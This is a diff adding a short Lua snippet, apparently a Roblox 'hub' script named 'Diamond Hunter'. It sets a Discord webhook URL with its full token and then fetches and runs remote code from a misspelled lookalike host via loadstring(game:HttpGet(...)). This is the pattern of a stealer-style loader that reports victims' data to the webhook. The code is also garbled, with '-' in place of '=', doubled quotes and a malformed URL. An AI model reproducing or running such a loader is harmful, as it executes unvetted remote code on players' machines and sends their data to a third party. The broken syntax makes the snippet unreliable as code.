@@ -1,0 +1,6 @@
+```lua
+_G.Username - ''execute_7766''
+_G.HubName - ''Diamond Hunter''
+_G.WebhookUrl - ''https://discord.com/api/webhooks/1113317482049048636/ZF0WtbUHVuR807kGHIbSfXuHaVG5d5oVVKl7IGkSBRzBvF8q-EOuMdERWvvk88OCWrcr''
+ 
+loadstring(game:HttpGet(''https//raw.gifhuhusercontent.com/Jayiioceanii/PeakonTop/main/peak.lua''))()
